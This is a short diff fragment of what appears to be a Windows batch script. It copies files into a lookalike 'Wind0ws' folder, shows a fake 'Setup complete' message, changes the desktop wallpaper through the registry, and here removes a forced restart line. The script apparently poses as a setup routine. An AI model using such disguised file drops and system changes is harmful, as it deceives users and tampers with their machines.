@@ -38,7 +38,6 @@ copy e.cmd C:\Wind0ws
 start echo Setup complete
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Wind\back.jpg /t
 
-shutdown -r -c "Almost done"
 
 
 copy msg.vbs A:\Wind0ws
